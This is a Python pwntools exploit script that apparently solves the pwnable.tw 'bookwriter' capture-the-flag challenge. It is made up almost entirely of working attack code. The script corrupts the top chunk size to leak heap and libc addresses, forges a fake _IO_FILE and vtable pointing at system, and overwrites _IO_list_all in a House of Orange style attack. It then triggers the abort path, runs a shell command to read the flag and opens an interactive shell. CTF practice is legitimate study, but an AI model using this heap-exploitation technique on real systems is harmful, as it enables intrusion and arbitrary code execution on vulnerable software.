#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10304
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./bookwriter_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.23.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x00000000004009FE
            b* 0x0000000000400Bad
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(size, data):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'page :', str(size))
    p.sendafter(b'Content :', data)

def view(idx):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'page :', str(idx))

def edit(idx, data):
    p.sendafter(b'choice :', str(3))
    p.sendafter(b'page :', str(idx))
    p.sendafter(b'Content:', data)

def info():
    p.sendafter(b'choice :', str(4))

# VARIABLE


# PAYLOAD

# Leak heap
# 0x18??
p.sendlineafter(b'Author :', b'a'*0x40)
add(0x18, b'b'*8) # 0
edit(0, b'b'*0x18)
edit(0, b'\0'*0x18 + b'\xe1\x0f\x00')

info()

p.recvuntil(b'a'*0x40)
heap_leak = u32(p.recv(4))
print("Heap leak: " + hex(heap_leak))
heap_base = heap_leak - 0x10
print("Heap base: " + hex(heap_base))

p.sendlineafter(b'no:0) ', str(0))

# Leak libc
add(0x78, b'c'*8) # 1
view(1)

p.recvuntil(b'c'*8)
libc_leak = u64(p.recv(6) + b'\0'*2)
print("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x3c4188
print("Libc base: " + hex(libc.address))

io_list_all = libc.sym._IO_list_all
system = libc.sym.system
print("io list all: " + hex(io_list_all))
print("system: " + hex(system))

for i in range(7): # 2 -> 8
    add(0x18, b'd'*8)

# Overwrite heap[8] to size[0] -> we can edit with big size
# GDB()
payload = flat(
    b'/bin/sh\0', 0x61, # top, top + 0x8
    0xdeadbeef, io_list_all - 0x10, # top + 0x10, top + 0x18
    2, 3, # top + 0x20, top + 0x28
    )
payload = payload.ljust(0xc0, b'\0') + p64(0) # top + 0xc0
payload = payload.ljust(0xd8, b'\0')

# fp = heap_base + 0x258 = jump_table
vtable = p64(0)*3 + p64(system) # jump_table[3]
vtable_addr = heap_base + 0x180 + 0xe0 # test 0x60
payload += p64(vtable_addr) + vtable # jump_table
edit(0, b'\0'*0x170 + payload) # 0x170: heap[8]

# Trigger malloc_printer
time.sleep(0.5)
p.sendafter(b'choice :', str(1))
time.sleep(0.5)
p.sendafter(b'page :', str(20))

# 20??
p.sendline(b'cat /home/bookwriter/flag')

p.interactive()